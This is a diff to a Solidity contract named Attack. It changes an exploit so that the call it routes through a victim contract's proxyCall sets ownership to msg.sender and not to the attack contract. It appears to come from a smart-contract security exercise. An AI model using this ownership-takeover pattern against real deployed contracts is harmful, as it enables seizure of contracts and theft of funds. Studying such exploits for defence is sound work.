@@ -35,7 +35,7 @@ contract Attack {
         (bool results, ) = victim.call(
             abi.encodeWithSignature(
                 "proxyCall(bytes)",
-                abi.encodeWithSignature("setowner(address)", address(this))
+                abi.encodeWithSignature("setowner(address)", msg.sender)
             )
         );
         require(results, "Failed to take ownership.");
